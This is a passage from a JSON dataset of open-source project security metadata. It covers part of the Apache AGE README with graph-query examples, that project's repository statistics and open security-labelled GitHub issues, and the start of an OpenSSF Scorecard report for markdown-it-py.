extension.\n\n```bash\nCREATE EXTENSION age;\n```\n```bash\nLOAD 'age';\n```\n```bash\nSET search_path = ag_catalog, \"$user\", public;\n```\n\n\n\n<h2><img height=\"20\" src=\"/img/contents.svg\">&nbsp;&nbsp;Quick Start</h2>\n\nTo create a graph, use the create_graph function located in the ag_catalog namespace.\n\n```bash\nSELECT create_graph('graph_name');\n```\n\nTo create a single vertex with label and properties, use the CREATE clause.\n\n```bash\nSELECT * \nFROM cypher('graph_name', $$\n    CREATE (:label {property:\"Node A\"})\n$$) as (v agtype);\n```\n\n```bash\nSELECT * \nFROM cypher('graph_name', $$\n    CREATE (:label {property:\"Node B\"})\n$$) as (v agtype);\n```\n\nTo create an edge between two nodes and set its properties:\n\n```bash\nSELECT * \nFROM cypher('graph_name', $$\n    MATCH (a:label), (b:label)\n    WHERE a.property = 'Node A' AND b.property = 'Node B'\n    CREATE (a)-[e:RELTYPE {property:a.property + '<->' + b.property}]->(b)\n    RETURN e\n$$) as (e agtype);\n```\n\nAnd to query the connected nodes:\n\n```\nSELECT * from cypher('graph_name', $$\n        MATCH (V)-[R]-(V2)\n        RETURN V,R,V2\n$$) as (V agtype, R agtype, V2 agtype);\n```\n\n<h2><img height=\"20\" src=\"/img/gettingstarted.svg\">&nbsp;&nbsp;Language Specific Drivers</h2>\n\nStarting with Apache AGE is very simple. You can easily select your platform and incorporate the relevant SDK into your code.\n</br>\n</br>\n\n<p align=\"center\">\n<img src=\"/img/age-02.png\" width=\"80%\" height=\"80%\">\n</p>\n\n\n<h4>Built-in</h4>\n\n- [Go driver](./drivers/golang)\n- [Java driver](./drivers/jdbc)\n- [NodeJs driver](./drivers/nodejs)\n- [Python driver](./drivers/python)\n\n<h4>Community-driven Driver</h4>\n\n- [Apache AGE Rust Driver](https://github.com/Dzordzu/rust-apache-age.git)\n- [Apache AGE .NET Driver](https://github.com/Allison-E/pg-age)\n\n<h2><img height=\"20\" src=\"/img/visualization.svg\">&nbsp;&nbsp;Graph Visualization Tool for AGE</h2>\n\n\nApache AGE Viewer is a user interface for Apache AGE that provides visualization and exploration of data.\nThis web visualization tool allows users to enter complex graph queries and explore the results in graph and table forms.\nApache AGE Viewer is enhanced to proceed with extensive graph data and discover insights through various graph algorithms.\nApache AGE Viewer will become a graph data administration and development platform for Apache AGE to support multiple relational databases: <https://github.com/apache/age-viewer>.\n\n**This is a visualization tool.**\nAfter installing AGE Extension, you may use this tool to get access to the visualization features.\n\n\n![Viewer gdb, and graph](/img/agce.gif)\n\n\n<h2><img height=\"20\" src=\"/img/videos.png\">&nbsp;&nbsp;Video Links</h2>\n\nYou can also get help from these videos. \n\n- Install on [Windows](https://www.youtube.com/watch?v=ddk8VX8Hm-I&list=PLGp3huJbWNDjgwP7s99Q-9_w1vxpjNHXG)\n- Install on [MacOS](https://www.youtube.com/watch?v=0-qMwpDh0CA)\n\n\n\n<h2><img height=\"20\" src=\"/img/community.svg\">&nbsp;&nbsp;Contributing</h2>\n\nYou can improve ongoing efforts or initiate new ones by sending pull requests to [this repository](https://github.com/apache/age).\nAlso, you can learn from the code review process, how to merge pull requests, and from code style compliance to documentation by visiting the [Apache AGE official site - Developer Guidelines](https://age.apache.org/contribution/guide).\nSend all your comments and inquiries to the user mailing list, users@age.apache.org.\n",
        "num_commits": 759,
        "project_age_days": 1581,
        "project_created_at": "2020-07-01",
        "latest_updated_at": "2024-10-27",
        "latest_pushed_at": "2024-09-27",
        "num_contributors": 85,
        "num_pull": 1313,
        "num_issues": 2042,
        "num_opening_issue": 153,
        "project_size(kB)": 47637,
        "num_stargazers": 3096,
        "num_watchers": 3096,
        "num_forks": 409,
        "num_subscribers": 67,
        "SecurityPolicy_created_at": "2021-07-19 11:31:44",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "url": "https://github.com/apache/.github/commit/c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "date": "2021-07-19 11:31:44"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/apache/age/issues/441",
                "title": "Ensure that the Dependencies of each Driver are Up-to-Date and Secure ",
                "labels": [
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 441,
                "id": 1513044178,
                "state": "open",
                "project_created_at": "2022-12-28T18:13:48Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:16:03Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1377730917"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:42Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1377735163"
                    },
                    {
                        "body": "Hi. Looking to get started on this.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:06:41Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1380627613"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:18Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1501176609"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/440",
                "title": "Check the Go Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 440,
                "id": 1513043516,
                "state": "open",
                "project_created_at": "2022-12-28T18:12:35Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:59Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1377730842"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:39Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1377735109"
                    },
                    {
                        "body": "Hi! Will be working on this.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:06:00Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1380625785"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:09Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1501176582"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/439",
                "title": "Check the Python Driver for Security Issues",
                "labels": [
                    "python",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 439,
                "id": 1513043213,
                "state": "open",
                "project_created_at": "2022-12-28T18:12:05Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:28Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1377730145"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:27Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1377734879"
                    },
                    {
                        "body": "Hi! I will be working on this. Any resources would be useful.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:05:42Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1380625039"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:01Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1501176562"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/438",
                "title": "Check the Java Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "java",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 438,
                "id": 1513042732,
                "state": "open",
                "project_created_at": "2022-12-28T18:11:23Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:23Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1377730072"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:23Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1377734797"
                    },
                    {
                        "body": "@dehowef Hi, I am assuming the procedure for finding these security issues are specific for each Language driver? Or is there a protocol to follow?",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:05:17Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1380623882"
                    },
                    {
                        "body": "@aru-d-at There is no defined protocol to follow yet. A good thing to do would be to go over general good security practice and see if it is implemented in the drivers",
                        "user": "dehowef",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-17T06:02:28Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1384874408"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:29:52Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1501176522"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/437",
                "title": "Check the NodeJs Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "nodejs",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 437,
                "id": 1513041699,
                "state": "open",
                "project_created_at": "2022-12-28T18:09:41Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team. ",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-09T19:16:46Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1376156578"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-09T19:18:48Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1376159234"
                    },
                    {
                        "body": "Hi, I am the Intern Arunabh who will tackle the issue.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-11T15:46:18Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1378991744"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-25T13:08:15Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1483819900"
                    },
                    {
                        "body": "Hello, I'm Hammad Saleem, I'm excited/eager to start with this project",
                        "user": "hammadsaleemm",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-26T09:04:59Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1484037826"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 5,
        "num_security_issue_and_pull": 5,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/apache/age/issues/441",
                "title": "Ensure that the Dependencies of each Driver are Up-to-Date and Secure ",
                "labels": [
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 441,
                "id": 1513044178,
                "state": "open",
                "project_created_at": "2022-12-28T18:13:48Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:16:03Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1377730917"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:42Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1377735163"
                    },
                    {
                        "body": "Hi. Looking to get started on this.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:06:41Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1380627613"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:18Z",
                        "url": "https://github.com/apache/age/issues/441#issuecomment-1501176609"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/440",
                "title": "Check the Go Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 440,
                "id": 1513043516,
                "state": "open",
                "project_created_at": "2022-12-28T18:12:35Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:59Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1377730842"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:39Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1377735109"
                    },
                    {
                        "body": "Hi! Will be working on this.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:06:00Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1380625785"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:09Z",
                        "url": "https://github.com/apache/age/issues/440#issuecomment-1501176582"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/439",
                "title": "Check the Python Driver for Security Issues",
                "labels": [
                    "python",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 439,
                "id": 1513043213,
                "state": "open",
                "project_created_at": "2022-12-28T18:12:05Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:28Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1377730145"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:27Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1377734879"
                    },
                    {
                        "body": "Hi! I will be working on this. Any resources would be useful.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:05:42Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1380625039"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:30:01Z",
                        "url": "https://github.com/apache/age/issues/439#issuecomment-1501176562"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/438",
                "title": "Check the Java Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "java",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 438,
                "id": 1513042732,
                "state": "open",
                "project_created_at": "2022-12-28T18:11:23Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team.",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-10T19:15:23Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1377730072"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-10T19:19:23Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1377734797"
                    },
                    {
                        "body": "@dehowef Hi, I am assuming the procedure for finding these security issues are specific for each Language driver? Or is there a protocol to follow?",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-12T16:05:17Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1380623882"
                    },
                    {
                        "body": "@aru-d-at There is no defined protocol to follow yet. A good thing to do would be to go over general good security practice and see if it is implemented in the drivers",
                        "user": "dehowef",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-17T06:02:28Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1384874408"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-09T17:29:52Z",
                        "url": "https://github.com/apache/age/issues/438#issuecomment-1501176522"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/age/issues/437",
                "title": "Check the NodeJs Driver for Security Issues",
                "labels": [
                    "good first issue",
                    "nodejs",
                    "driver",
                    "security"
                ],
                "user": "eyab",
                "issue_author_association": "MEMBER",
                "number": 437,
                "id": 1513041699,
                "state": "open",
                "project_created_at": "2022-12-28T18:09:41Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "Hi, I am the new Operations Manager Steve from Vancouver Team. ",
                        "user": "Steves452",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-09T19:16:46Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1376156578"
                    },
                    {
                        "body": "Hi, I am the new Operations Manager Jayden from Vancouver Team.",
                        "user": "JYage",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-09T19:18:48Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1376159234"
                    },
                    {
                        "body": "Hi, I am the Intern Arunabh who will tackle the issue.",
                        "user": "aru-d-at",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-11T15:46:18Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1378991744"
                    },
                    {
                        "body": "Looking forward to study more about this project and contribute.",
                        "user": "Hasan-Iqtedar",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-25T13:08:15Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1483819900"
                    },
                    {
                        "body": "Hello, I'm Hammad Saleem, I'm excited/eager to start with this project",
                        "user": "hammadsaleemm",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-26T09:04:59Z",
                        "url": "https://github.com/apache/age/issues/437#issuecomment-1484037826"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 5,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "executablebooks/markdown-it-py",
        "project_url": "https://github.com/executablebooks/markdown-it-py",
        "SSF": {
            "date": "2024-10-30T00:13:31+07:00",
            "repo": {
                "name": "github.com/executablebooks/markdown-it-py",
                "commit": "c10312e2e475a22edb92abede15d3dcabd0cac0c"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.1,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "12 out of 30 merged PRs checked by a CI test -- score normalized to 4",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "Found 6/25 approved changesets -- score normalized to 2",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: sphinx-doc contributor org/company found, docutils contributor org/company found, executablebooks contributor org/company found, sphinx-extensions2 contributor org/company found, markdown-it-rust contributor org/company found, useblocks contributor org/company found, marvel-nccr contributor org/company found, aiidaplugins contributor org/company found, école polytechnique fédérale de lausanne contributor org/company found, aiidateam contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 10 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found",
                        "Info: PythonAtherisFuzzer integration found: tests/fuzz/fuzz_markdown.py:3",
                        "Info: PythonAtherisFuzzer integration found: tests/fuzz/fuzz_markdown_extended.py:3"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/fuzz.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/fuzz.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/fuzz.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/fuzz.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/fuzz.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/fuzz.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:117: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:103: update your workflow using https://app.stepsecurity.io/secureworkflow/executablebooks/markdown-it-py/tests.yml/master?enable=pin",
